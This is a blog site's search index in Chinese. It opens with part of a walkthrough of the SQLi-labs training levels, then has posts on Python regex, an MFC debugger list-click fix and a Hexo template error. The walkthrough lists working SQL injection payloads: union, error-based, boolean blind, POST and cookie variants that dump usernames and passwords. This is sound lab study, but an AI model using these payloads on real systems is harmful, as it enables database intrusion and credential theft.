+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,TABLE_NAME,<span class="number">2</span> <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;security&#x27;</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/11.png"></p>
+</li>
+<li><p>获取列名：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,COLUMN_NAME,<span class="number">2</span> <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> TABLE_SCHEMA=<span class="string">&#x27;security&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> %<span class="number">23</span></span><br><span class="line"></span><br><span class="line">payload：?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27; union select 1,COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; and TABLE_SCHEMA=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; limit 2,1 %23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/12.png"></p>
+<p><img data-src="/images/sql/13.png"></p>
+</li>
+<li><p>获取表信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">security</span>,<span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取第二条数据，以此类推</span></span><br><span class="line"></span><br><span class="line">payload：?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27; union select 1,username,password from security,users limit 1,1 %23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/14.png"></p>
+<p><img data-src="/images/sql/15.png"></p>
+</li>
+</ul>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><ul>
+<li><p>第二关是基于错误数字型注入</p>
+</li>
+<li><p>首先构造payload：<code>?id=1&#39;</code></p>
+<p><img data-src="/images/sql/16.png"></p>
+</li>
+<li><p>构造闭合：<code>1 or 1=1 %23</code>，测试</p>
+<p><img data-src="/images/sql/17.png"></p>
+</li>
+<li><p>没有报错，说明可以注入</p>
+</li>
+<li><p>获取当前查询的列数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/18.png"></p>
+</li>
+<li><p>获取数据库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/19.png"></p>
+</li>
+<li><p>接下来的操作和前边一样了</p>
+</li>
+</ul>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><ul>
+<li><p>构造payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?id=1&#x27;</span><br><span class="line">payload：?id=1&#x27;))</span><br><span class="line">payload：?id=1&quot;</span><br><span class="line">payload：?id=1&quot;))</span><br><span class="line">payload：?id=1&#x27;)</span><br><span class="line">payload：?id=1&quot;)</span><br><span class="line"><span class="comment">-- 在前边的关卡，报错方式比较简单，这6种可以都尝试一下</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/20.png"></p>
+</li>
+<li><p>获取数据集名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：-1&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/21.png"></p>
+</li>
+</ul>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><ul>
+<li><p>这一关使用双注入来完成（感兴趣的小伙伴请自行查阅）</p>
+</li>
+<li><p>构造闭合语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：id=1&#x27; and 0 %23</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/22.png"></p>
+</li>
+<li><p>获取数据库的名字</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and 0 union <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">database</span>(), <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">count</span>：聚合函数</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：分组语句</span><br><span class="line"><span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)：取整</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/23.png"></p>
+</li>
+</ul>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><ul>
+<li><p>这一关使用基于布尔的盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=1 %23</span><br><span class="line">1&#x27; and 1=2 %23</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/24.png"></p>
+<p><img data-src="/images/sql/25.png"></p>
+</li>
+<li><p>可以看到，and后面的表达式为真就输出内容，为假不输出</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())=判断的长度 %23</span><br><span class="line">1&#x27; and substr(database(),第n个字母,1)=数值 %23</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/26.png"></p>
+</li>
+</ul>
+<p><img data-src="/images/sql/27.png"></p>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><ul>
+<li><p>这一关是post注入</p>
+</li>
+<li><p>构造语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname=&#x27; union <span class="keyword">select</span> <span class="keyword">version</span>(), <span class="keyword">database</span>() %<span class="number">23</span> %<span class="number">23</span>&amp;passwd=</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/28.png"></p>
+</li>
+</ul>
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><ul>
+<li><p>这一关是cookie的操作</p>
+</li>
+<li><p>先构造payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname=zhubokai&#x27; and updatexml(1,concat(0x7e, version()),1) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/29.png"></p>
+</li>
+</ul>
+<ul>
+<li>就带想入门的小伙伴写到这里，剩下的感兴趣的可以自己再写</li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python正则表达式入门</title>
+    <url>/python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</url>
+    <content><![CDATA[<ul>
+<li><p>本节不涉及理论讲解，主要作为文档查阅</p>
+<a id="more"></a> 
+
+</li>
+</ul>
+<h1 id="Python支持的正则表达式元字符和语法"><a href="#Python支持的正则表达式元字符和语法" class="headerlink" title="Python支持的正则表达式元字符和语法"></a>Python支持的正则表达式元字符和语法</h1><table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">意义</th>
+<th align="left">实例</th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">\</td>
+<td align="left">特殊符号的转义</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">^</td>
+<td align="left">匹配字符串的开头</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">[^]</td>
+<td align="left">对字符集取反</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">$</td>
+<td align="left">匹配字符串的结尾</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">.</td>
+<td align="left">任意字符</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">{}</td>
+<td align="left">标识出现的次数</td>
+<td align="left">{n}：出现 n 次<br/>{n,}：出现 n ~ 不限次数<br/>{n, m}：出现 n ~ m次</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">?</td>
+<td align="left">表示0个或1个 {0,1}</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">+</td>
+<td align="left">表示1个或更多 {1,}</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">*</td>
+<td align="left">表示可有可无 {0,}</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">|</td>
+<td align="left">匹配多个条件的某一个</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">匹配集合中的字符</td>
+<td align="left"></td>
+<td align="left"><code>[abc]</code>：只匹配<code>abc</code><br/><code>[a-c]</code>：也是<code>abc</code><br/><code>[a-cA-C]</code>：<code>abc</code> 或者 <code>ABC</code><br/><code>[^abc]</code>：<code>abc </code>以外的其它任意字符</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">\d</td>
+<td align="left">匹配一个数字字符，等价于[0-9]</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">\D</td>
+<td align="left">匹配一个非数字字符，等价于<code>[^0-9]</code></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">\s</td>
+<td align="left">匹配任何空白字符，包括空格，制表符，换页符等等</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">\S</td>
+<td align="left">匹配任何非空白字符</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">\w</td>
+<td align="left">匹配包括下划线的任何单词字符，等价于<code>[A-Za-z0-9_]</code></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">\W</td>
+<td align="left">匹配任何非单词字符，等价于<code>[^A-Za-z0-9_]</code></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">向前向后查找</td>
+<td align="left">(?&lt;=&lt;&gt;)：被匹配字符前必须有 &lt;&gt;<br/>(?=&lt;&gt;)：被匹配字符后必须有 &lt;&gt;</td>
+<td align="left"><code>fdsi</code>&lt;&gt;<code>fjids</code>&lt;&gt;<code>djfis</code><br/><code>fsif</code>&lt;&gt;<code>fe+_Fei</code>&lt;&gt;<code>fei</code><br/><html>&lt;&gt;hello 小笨蛋&lt;&gt;</html></td>
+<td align="left">结果为&lt;&gt;  &lt;&gt;中内容</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>贪婪模式和非贪婪模式：</p>
+<ul>
+<li><p>python里的数量词默认是贪婪模式的，意思是总是尝试匹配尽可能多的字符；非贪婪的则相反，总是尝试匹配尽可能少的字符</p>
+</li>
+<li><p>*?，+?，??，{m,n}?</p>
+</li>
+<li><p>前面的*，+，？等都是贪婪模式，也就是尽可能匹配，后面加？好使其变成惰性匹配</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">正则表达式：ab* ， 如果用于查找<span class="string">&quot;abbbc&quot;</span>，将找到<span class="string">&quot;abbb&quot;</span></span><br><span class="line">如果使用非贪婪方法 <span class="string">&quot;ab*?&quot;</span>，将找到<span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>实际应用：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">匹配邮箱: ^[\w+]&#123;<span class="number">0</span>,<span class="number">19</span>&#125;@[\w+]&#123;<span class="number">1</span>,<span class="number">13</span>&#125;\.[com,cn,net]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;$</span><br><span class="line">匹配数字: ^(-)?(\d)+(\.\d*)?$</span><br><span class="line">匹配年月日：^[1-9]\d&#123;0,3&#125;-(0?[1-9]|1[0-2])-(0?[1-9]|[12]\d|3[01])$   (不考虑闰年)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h1 id="RE模块"><a href="#RE模块" class="headerlink" title="RE模块"></a>RE模块</h1><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ul>
+<li><p>pattern：要匹配的模式</p>
+</li>
+<li><p>string：要匹配的字符串</p>
+</li>
+<li><p><code>compile(pattern)</code>：创建模式对象</p>
+</li>
+<li><p><code>search(pattern, string)</code>：在字符串中寻找模式</p>
+<ul>
+<li><p>只匹配最开始出现的连续的数字</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">obj = re.search(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;abv123fds345d_&#x27;</span>)</span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">&lt;re.Match object; span=(<span class="number">3</span>, <span class="number">6</span>), match=<span class="string">&#x27;123&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><code>match(pattern, string)</code>：在字符串开始处匹配模式</p>
+<ul>
+<li>如果字符串是以数字开头，可以匹配到第一组连续的数字</li>
+<li>如果不以数字开头，返回None</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">obj = re.match(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;123abc123&#x27;</span>)</span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">3</span>), match=<span class="string">&#x27;123&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">obj1 = re.match(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;abc123&#x27;</span>)</span><br><span class="line">print(obj1)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>findall(pattern, string)</code>：列表形式返回匹配项</p>
+<ul>
+<li>如果没有匹配到，返回空列表</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">obj = re.findall(<span class="string">&#x27;\d&#x27;</span>, <span class="string">&#x27;abc123abc123&#x27;</span>)</span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>]</span><br><span class="line"></span><br><span class="line">obj1 = re.findall(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;abc123abc123&#x27;</span>)</span><br><span class="line">print(obj1)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">[<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;123&#x27;</span>]</span><br><span class="line"></span><br><span class="line">obj2 = re.findall(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;abcdefg&#x27;</span>)</span><br><span class="line">print(obj2)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>sub(pat, repl, string)</code>：替换字符串中的匹配项</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">obj = re.sub(<span class="string">&#x27;[a-z]+&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;abc小笨蛋def&#x27;</span>)</span><br><span class="line">print(obj)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">hello小笨蛋hello</span><br><span class="line"></span><br><span class="line">obj1 = re.sub(<span class="string">&#x27;\d+&#x27;</span>,<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;abc123def456&#x27;</span>)</span><br><span class="line">print(obj1)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">abc|<span class="function"><span class="keyword">def</span>|</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">obj2 = re.sub(&#x27;[a-z]&#x27;,&#x27;hei&#x27;,&#x27;abc小笨蛋def&#x27;)</span><br><span class="line">print(obj2)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">heiheihei小笨蛋heiheihei</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>split(pattern, string)</code>：根据模式分割字符串</p>
+</li>
+</ul>
+<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><table>
+<thead>
+<tr>
+<th align="left">模式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>re.l</code></td>
+<td align="left">使匹配对大小不敏感</td>
+</tr>
+<tr>
+<td align="left"><code>re.L</code></td>
+<td align="left">做本地化识别（locale-aware）匹配</td>
+</tr>
+<tr>
+<td align="left"><code>re.M</code></td>
+<td align="left">多行匹配，影响 ^ 和 $</td>
+</tr>
+<tr>
+<td align="left"><code>re.S</code></td>
+<td align="left">使 <code>.</code> 匹配包括换行在内的所有字符</td>
+</tr>
+<tr>
+<td align="left"><code>re.U</code></td>
+<td align="left">根据Unicode字符集解析字符，这个标志影响 \w，\W，\b，\B</td>
+</tr>
+<tr>
+<td align="left"><code>re.X</code></td>
+<td align="left">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MFCList点击某个单独的数据</title>
+    <url>/mfc-list%E7%82%B9%E5%87%BB.html</url>
+    <content><![CDATA[<ol>
+<li><p>在编写调试器的时候，遇到了一个小问题，内存区域鼠标点击的时候，获取不到确切的位置</p>
+</li>
+<li><p>内存区域将一个list列表分成了三份，<strong>地址区</strong>，<strong>hex数据区</strong>，<strong>ASCII</strong>码区</p>
+</li>
+<li><p>然而我获取到的是一整块十六进制数据，无法点击并且修改</p>
+<a id="more"></a> 
+</li>
+<li><p>我的解决方法是：将<strong>hex数据区</strong>的数据分成十六份，以字节的方式输出</p>
+</li>
+<li><p>获取点击的代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CPoint pos;</span><br><span class="line">    GetCursorPos(&amp;pos);</span><br><span class="line">    m_addressList.ScreenToClient(&amp;pos);</span><br><span class="line">    <span class="keyword">int</span> nIndex = m_addressList.HitTest(pos);</span><br><span class="line">    <span class="keyword">if</span> (nIndex != <span class="number">-1</span>) &#123;</span><br><span class="line">        CString buff;</span><br><span class="line">        buff = m_addressList.GetItemText(nIndex, <span class="number">0</span>);</span><br><span class="line">        MessageBox(buff);</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><p>发现获取不到点击的坐标，起初以为是将<strong>hex数据区</strong>拆分的方式不对，导致获取不到，后来经过研究，是这段代码的问题</p>
+</li>
+<li><p>修改获取点击的代码后就可以了</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CPoint  <span class="built_in">point</span>;</span><br><span class="line">    GetCursorPos(&amp;<span class="built_in">point</span>);</span><br><span class="line">    <span class="comment">//将屏幕坐标转到客户区坐标</span></span><br><span class="line">    m_addressList.ScreenToClient(&amp;<span class="built_in">point</span>);</span><br><span class="line"></span><br><span class="line">    LVHITTESTINFO info;</span><br><span class="line">    info.pt = <span class="built_in">point</span>;</span><br><span class="line">    <span class="keyword">int</span> Itsub = m_addressList.SubItemHitTest(&amp;info);</span><br><span class="line">    <span class="keyword">int</span> pointX = info.iItem;<span class="comment">//行号从0开始</span></span><br><span class="line">    <span class="keyword">int</span> pointY = info.iSubItem;<span class="comment">//列号从0开始</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取鼠标点击位置，显示在HEX数据区</span></span><br><span class="line">    CString strMem;</span><br><span class="line">    strMem.Format(m_addressList.GetItemText(pointX, pointY));</span><br><span class="line"></span><br><span class="line">    m_editMem = <span class="keyword">new</span> CEditMem;</span><br><span class="line">    m_editMem-&gt;Create(IDD_EDITMEM); <span class="comment">//创建一个非模态对话框  </span></span><br><span class="line">    m_editMem-&gt;ShowWindow(SW_SHOWNORMAL);</span><br><span class="line">    <span class="comment">//m_editMem-&gt;DoModal();</span></span><br><span class="line"></span><br><span class="line">    m_editMem-&gt;m_editHex.SetWindowText(strMem);</span><br><span class="line">    <span class="comment">//SetDlgItemText(m_editMem-&gt;IDD_EDITMEM, strMem);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//delete m_editMem;</span></span><br><span class="line"></span><br><span class="line">    *pResult = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我是创建了一个双击事件，获取点击位置的数据，打印在弹出的对话框中，注意这里要使用非模态对话框，如果使用模态对话框的话，就会一直卡在<code>DoModal</code>处，也不要在这里使用<code>delete</code>，我是创建了一个<code>OnCacel()</code>，添加<code>m_editMem-&gt;DestroyWindow();</code></p>
+</li>
+<li><p>到这里就完成了</p>
+<p><img data-src="/images/5.png"></p>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>C++</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>unknown block tag: endblock</title>
+    <url>/endblock.html</url>
+    <content><![CDATA[<h2 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h2><p>在快乐的完善博客的时候，遇到了不快乐的事情，我的大部分菜单突然打开都是一片空白，像什么关于，标签，分类等等，(之前是好的，可能是由于瞎改了什么东西)如下图，打开我的标签页</p>
+<a id="more"></a>
+
+<p><img data-src="/images/2.png"></p>
+<p>真是神奇的一幕</p>
+<h2 id="排查错误"><a href="#排查错误" class="headerlink" title="排查错误"></a>排查错误</h2><p>查看配置文件，查看md文件，都没有问题，删除这几个文件夹，重新生成一份也没有任何好转，然后查看hexo报错</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/3.png"></p>
+<p>好嘛，原来是因为大括号的原因</p>
+<h2 id="确定错误"><a href="#确定错误" class="headerlink" title="确定错误"></a>确定错误</h2><p>然后就找被我修改过的文件，终于确定了错误的地方</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">layout/page.swig</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="images/4.png"></p>
+<p>我也不知道为什么当时会加它们，但是把它们删掉后就没问题了</p>
+<p>最后重新部署上传就好了</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> hexo clean &amp;&amp; hexo g</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+</search>
